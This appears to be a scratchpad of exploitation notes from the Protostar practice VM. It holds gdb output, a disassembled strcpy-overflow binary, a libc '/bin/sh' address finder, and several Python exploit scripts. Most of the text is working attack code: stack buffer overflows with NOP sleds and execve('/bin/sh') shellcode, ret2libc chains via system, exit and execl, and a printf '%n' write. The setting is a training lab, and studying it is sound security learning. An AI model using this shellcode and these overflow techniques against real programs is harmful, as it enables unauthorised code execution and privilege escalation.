$1 = {<text variable, no debug info>} 0xb7eddf90 <__printf>



user@protostar:~$ ./getenvaddr  PATH ./vuln
PATH will be at 0xbfffff26

user@protostar:~$ export FMT="%s"
user@protostar:~$ ./getenvaddr  FMT ./vuln
FMT will be at 0xbfffffe9




main(){
        char *p;

        p = 0x4002c000;
        while (1) {
                while (*p++ != '/') ;
                if (strcmp(p-1, "/bin/sh") == 0) {
                        printf("0x%08x\n", p-1);
                        return 0;
                }
        }
}


user@protostar:~$ ./fa1 
0xb7fb63bf


(gdb) p execl
$1 = {<text variable, no debug info>} 0xb7f2e460 <*__GI_execl>



(gdb) disassemble  main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x30
0x080483cd <main+9>:    cmp    DWORD PTR [ebp+0x8],0x2
0x080483d1 <main+13>:   jne    0x80483eb <main+39>
0x080483d3 <main+15>:   mov    eax,DWORD PTR [ebp+0xc]
0x080483d6 <main+18>:   add    eax,0x4
0x080483d9 <main+21>:   mov    eax,DWORD PTR [eax]
0x080483db <main+23>:   mov    DWORD PTR [esp+0x4],eax
0x080483df <main+27>:   lea    eax,[esp+0x12] <== buffrer
0x080483e3 <main+31>:   mov    DWORD PTR [esp],eax
0x080483e6 <main+34>:   call   0x80482fc <strcpy@plt>
0x080483eb <main+39>:   mov    eax,0x0
0x080483f0 <main+44>:   leave  
0x080483f1 <main+45>:   ret

r $(python exploit.py)


x/32wx $esp


x/64wx $esp


import struct

getchar = 0xb7ef6570
system = 0xb7ecffb0
execl = 0xb7f2e460
exit = 0xb7ec60c0
printf = 0xb7eddf90
path = 0xbfffff1d
fmt = 0xbfffffe7
sh = 0xb7fb63bf

#payload = "A"*42
#payload += "B"*4
#payload += struct.pack('I', printf)
#payload += struct.pack('I', exit)
#payload += struct.pack('I', sh)

#payload = "A"*42
#payload += struct.pack('I', system)
#payload += struct.pack('I', exit)
#payload += struct.pack('I', sh)

payload = "A"*42
payload += struct.pack('I', execl)
payload += struct.pack('I', exit)
payload += struct.pack('I', sh)
payload += struct.pack('I', sh)
payload += "\x00\x00\x00\00" 

print payload

 




Breakpoint 2, 0x080483e4 in main () at fav.c:2
2        execl("/bin/sh", "/bin/sh", 0); 
(gdb) x/12wx $esp
0xbffff7d0:     0x080484b0      0x080484b0      0x00000000      0xb7fd7ff4
0xbffff7e0:     0x08048400      0x00000000      0xbffff868      0xb7eadc76
0xbffff7f0:     0x00000001      0xbffff894      0xbffff89c      0xb7fe1848



Normal 
0xbffff7c0
GDB
0xbffff790


(gdb) p 0xbffff7c0 - 0xbffff790
$1 = 48


(gdb) p getchar
$2 = {int (void)} 0xb7ef6570 <getchar>

(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/32wx 0xbffff790
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff7e0:     0x00000000      0xbffff884      0xbffff88c      0xb7fe1848
0xbffff7f0:     0xbffff840      0xffffffff      0xb7ffeff4      0x0804824d
0xbffff800:     0x00000001      0xbffff840      0xb7ff0626      0xb7fffab0



char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


Linux
0xbffff7c0
gdb


user@protostar:~$ cat exploit5-2.py 
import struct

win = struct.pack("I", 0x080483f4)
nop = "\x90"
trap = "\xcc"

printf = struct.pack("I", 0xb7eddf90)
sh = struct.pack("I", 0xb7fb63bf)
getchar = struct.pack("I", 0xb7ef6570)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"



eip = struct.pack("I", 0xbffff7c0)
buffer = nop*16
buffer += shellcode 
buffer += "A"* (76 - len(buffer))
buffer += eip
print buffer

#gdb 0xbffff790
#linux  0xbffff7c0
#buffer = "A"*76+"B"*4+"C"*100

eip = struct.pack("I", 0xbffff790+80)
buffer = "A"*76
buffer += eip
buffer += shellcode 
buffer += nop*(100-len(shellcode)) 
#print buffer

eip = struct.pack("I", 0xbffff790+80)
buffer = "A"*76
buffer += eip
buffer += nop*20
buffer += getchar
#buffer += "JUNK" 
#buffer += sh 
#buffer += nop*(100-12) 
#print buffer



(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7eddf90 <__printf>


user@protostar:~$ ./fa1 
0xb7fb63bf

import struct

win = struct.pack("I", 0x080483f4)
nop = "\x90"
trap = "\xcc"

printf = struct.pack("I", 0xb7eddf90)
sh = struct.pack("I", 0xb7fb63bf)
getchar = struct.pack("I", 0xb7ef6570)
#getchar = struct.pack("I", 0x08048388)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


# linux @buffer 0xbffff7c0
# gdb @buffer 0xbffff790
eip = struct.pack("I", 0xbffff7b0)
buffer = nop*32
#buffer += shellcode
buffer += getchar
buffer += "A"* (76 - len(buffer))
buffer += eip
print buffer

#gdb 0xbffff790
#linux  0xbffff7c0
#buffer = "A"*76+"B"*4+"C"*100

eip = struct.pack("I", 0xbffff790+80)
buffer = "A"*76
buffer += eip
buffer += shellcode
buffer += nop*(100-len(shellcode))
#print buffer

eip = struct.pack("I", 0xbffff790+80)
buffer = "A"*76
buffer += eip
buffer += nop*20
buffer += getchar
#buffer += "JUNK"
#buffer += sh
#buffer += nop*(100-12)
#print buffer





import struct

trap = "\xcc"
nop = "\x90"
#(gdb) p system
#$5 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
#(gdb) p exit
#$6 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>


system = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
sh = struct.pack("I", 0xb7fb63bf)

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
#shellcode +="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

payload = "A"*76+"B"*4
#print payload

payload = nop*(76 - len(shellcode))
payload += shellcode
payload += struct.pack("I", 0xbffff740)
#payload += struct.pack("I", 0xbffff740+0x30)

# NOP | /bin/sh \x00 | system | exit | addr /bin/sh

eip = struct.pack("I", 0xbffff740)
eip = struct.pack("I", 0xbffff740+0x30)

payload = nop*76
payload += system
payload += exit
payload += sh

payload = trap*4
payload += system
payload += exit
payload += sh
payload = nop*(76-len(payload))
payload += eip

#0x6e69622f      0x0068732f

#print len(shellcode)
print payload



(gdb) x/32wx $esp
0xbffff730:     0xbffff740      0xbffff95d      0xbffff748      0xb7eada75
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff790:     0x00000000      0xbffff834      0xbffff840      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x08048234





@buffer 0xbffff730
@command 0xbffff728

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p printf
$2 = {<text variable, no debug info>} 0xb7eddf90 <__printf>
(gdb) p exit
$3 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>



import struct

# gdb
eip = struct.pack("I",  0xbffff710 + 76 + 4)
# linux
eip = struct.pack("I",  0xbffff740 + 76 + 4)

sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
sc += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
sc += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

#user@protostar:~$ ./fa1 
#0xb7fb63bf

user@protostar:~$ cat exploit2.py 
import struct

nop = "\x90"

# gdb
eip = struct.pack("I", 0xbffff6e0  + 76 + 4)

# linux
#eip = struct.pack("I",  0xbffff710 + 76 + 4)

sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
sc += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
sc += "\x80\xe8\xdc\xff\xff\xff/bin/sh"



system = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
#gdb

sh = struct.pack("I", 0xbffff6c8)
#linux
#sh = struct.pack("I", 0xb7fb63bf)
execl = struct.pack("I", 0xb7f2e460)
printf = struct.pack("I", 0xb7eddf90)

#(gdb) p system
#0xbffff71
#$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
#"(gdb) p exit
#$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
#(gdb) p execl
#$1 = {<text variable, no debug info>} 0xb7f2e460 <*__GI_execl>
#(gdb) p printf
#$2 = {<text variable, no debug info>} 0xb7eddf90 <__printf>



buffer = "A"*76
buffer += "B"*4
buffer += "C"*100

buffer = "A"*76
buffer += eip
buffer += sc
buffer += nop*(76+4+100 -len(buffer))

buffer = "A"*76
buffer += system
buffer += exit
buffer += sh
buffer += nop*(76+4+100 -len(buffer))

buffer = "A"*76
buffer += system
buffer += exit
# sh = @buffer + 76 A + 4 system  + 4 exit + 4 @sh
#gdb
#buffer += struct.pack("I", 0xbffff6d0  + 76 + 4 + 4 + 4)
#linux
buffer += struct.pack("I", 0xbffff710  + 76 + 4 + 4 + 4)
buffer += "/bin/sh\n"
buffer += nop*(76+4+100 -len(buffer))

# execl | xxx | fav | fav | 0
# printf | execl | "%3$n" | fav | fav | here
# 76 A | 4 @printf | 4 @execl | @fmt | @sh | @sh | @here | "%3$n\n" | "/bin/sh\n"
buffer = "A"*76
buffer += printf
buffer += execl
# @fmt = @buffer + 76 A + 4 printf + 4 execl  + 4 fmt + 4 @sh + 4 @sh + 4 @here
#gdb
buffer += struct.pack("I", 0xbffff6d0  + 76 + 6*4)
#linux
#buffer += struct.pack("I", 0xbffff710  + 76 + 6*4)
buffer += sh
buffer += sh
#@sh unsuccessfull
#buffer += struct.pack("I", 0xbffff6d0  + 76 + 6*4 + len("%3$n\n"))
#buffer += struct.pack("I", 0xbffff6d0  + 76 + 6*4 + len("%3$n\n"))
#@here
buffer += struct.pack("I", 0xbffff6d0  + 76 + 5*4)
buffer += "%3$n\n"
buffer += nop*(76+4+100 -len(buffer))


print buffer

















